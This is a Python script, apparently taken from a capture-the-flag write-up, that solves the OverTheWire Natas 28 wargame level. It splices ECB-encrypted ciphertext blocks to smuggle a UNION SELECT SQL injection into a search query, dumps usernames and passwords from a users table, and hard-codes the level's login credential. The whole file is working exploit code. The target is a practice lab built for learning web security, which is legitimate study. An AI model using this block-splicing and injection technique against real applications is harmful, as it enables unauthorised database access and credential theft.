# FROM http://alkalinesecurity.com/blog/ctf-writeups/natas-28-getting-it-wrong/

import requests
from urllib.parse import quote, unquote
import re
import base64

natas_url = "http://natas28.natas.labs.overthewire.org/index.php"
search_url = "http://natas28.natas.labs.overthewire.org/search.php/?query="
 
#authorization header
authentication = ('natas28', 'JWwR438wkgTsNKBbcJoowyysdM82YjeF')
 
print("Retrieving first ciphertext")
 
#pad plaintext to ensure it takes up a full ciphertext block
plaintext = "A"*10 + "B"*14
resp = requests.post(natas_url, data={"query": plaintext}, auth=authentication)
 
#get the raw bytes of the ciphertext
encoded_ciphertext = resp.url.split("query=")[1]
ciphertext = base64.b64decode(unquote(encoded_ciphertext))
 
#sql to inject into ciphertext query
new_sql = " UNION ALL SELECT concat(username,0x3A,password) FROM users #"
print(f"Appending query: {new_sql}")
 
#pad plaintext to ensure it also takes up a whole number of ciphertext blocks
plaintext = "A"*10 + new_sql + "B"*(16-(len(new_sql)%16))
offset = 48 + len(plaintext)-10

resp = requests.post(natas_url, data={"query": plaintext}, auth=authentication)
encoded_new_ciphertext = resp.url.split("query=")[1]
new_ciphertext = base64.b64decode(unquote(encoded_new_ciphertext))
encrypted_sql = new_ciphertext[48:offset]

#add the encrypted new sql into the final ciphertext
final_ciphertext = ciphertext[:64]+encrypted_sql+ciphertext[64:]

resp = requests.get(search_url, params={"query":base64.b64encode(final_ciphertext)}, auth=authentication)

print(f'Response: {re.findall("<li>(.*?)</li>", resp.text)[0]}')